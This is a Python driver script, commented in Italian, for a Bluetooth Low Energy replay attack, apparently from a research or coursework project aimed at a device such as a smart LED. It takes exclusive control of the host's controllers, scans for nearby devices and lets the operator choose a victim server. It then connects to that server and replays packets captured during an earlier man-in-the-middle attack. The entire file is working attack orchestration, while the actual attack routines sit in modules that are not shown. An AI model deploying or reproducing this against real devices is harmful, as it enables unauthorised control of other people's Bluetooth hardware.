from scapy.layers.bluetooth import *
from os import system
from time import sleep
from utility import *
from scan import *
from attacks import *

SCANNING_DURATION = 3
SERVER_LISTENING_TIMEOUT = 15

if __name__ == '__main__':

    #spegnimento dei controller in modo da togliere il controllo al sistema operativo
    system('hciconfig hci0 down; hciconfig hci1 down')

    #apertura socket di comuncazione ESCLUSIVA con il controller BLE
    try:
        server = BluetoothUserSocket(0)
        print('[OK] Server socket created')
    except Exception as e:
        print(e)
        exit()
    
    #fase di scanning
    try:
        print('Starting scanning process')
        start_scanning(server)
        sleep(SCANNING_DURATION)
        stop_scanning(server)
        print('[OK] Starting scanning completed')
    except Exception as e:
        print(e)
        exit()
    
    #selezione dispositivo di cui emulare l'advertising
    scanned_devices = collect_scanning_result(server)
    show_scanning_result(scanned_devices)
    selected_device_idx = input("Select server to connect to: ")
    scanned_devices_list = list(scanned_devices.items())
    victim_server = scanned_devices_list[int(selected_device_idx)]

    #lettura pacchetti precedentementi inoltrati e memorizzati durante un MITM attack
    pkts_list = rdpcap('./sent_pkts_led.pcap')

    #oggetto per la gestione dell'attacco una volta trovato il server vittima
    attack = replay(server, victim_server[0], pkts_list)

    #connessione del client malevolo al server legittimo e inizio advertising del server malevolo
    try:
        attack.victim_server_connect()
        print(f'[OK] Server socket connected to victim server ({attack.server_paddr})')
        print(f'[OK] Server handle found: {attack.server_handle}')
    except Exception as e:
        print(e)
        exit()

    print('Starting replay attack in interactive mode')
    
    #inizio dell'attacco
    attack.run(SERVER_LISTENING_TIMEOUT)

    
    
    